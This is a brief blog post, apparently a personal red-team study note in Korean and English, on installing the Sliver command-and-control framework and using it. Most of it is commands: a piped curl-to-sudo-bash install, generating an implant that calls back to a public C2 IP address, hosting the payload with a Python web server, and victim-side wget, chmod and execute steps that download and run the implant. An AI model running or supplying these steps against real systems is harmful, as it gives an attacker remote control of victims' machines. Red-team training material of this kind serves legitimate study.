---
title: Red-Team Framework - (1) Sliver
author: Jeongwon
date: 2025-03-26 12:24:00 +0900
categories: [Career, RedTeam]
tags: [writing]
render_with_liquid: false
---
## How to Install Sliver
###### `REF` : [Sliver wiki](https://sliver.sh/docs?name=Getting+Started)

```bash
sudo apt update
curl https://sliver.sh/install|sudo bash

systemctl status sliver # 실행 확인
systemctl start sliver # sliver 실행

sliver
```
![image](assets/img/red-framework-sliver/activate_sliver.png)<br><br><br>

## How to Use Sliver

```bash
# [Sliver] 임플란트 생성 및 Session 서버 생성
generate --http [C2서버 공인 IP] -s [임플란트 경로 & 파일명] --os [타겟 운영체제] --arch [타겟 아키텍쳐]
http -d 54.180.117.219 -l 80

# [공격자 Bash] 웹 서버 생성
python3 -m http.server 8443

# [피해자 Bash] http://54.180.117.219:8443/demo.exe 접근 후 실행
wget http://54.180.117.219:8443/test
chmod +x ./test
./test
```
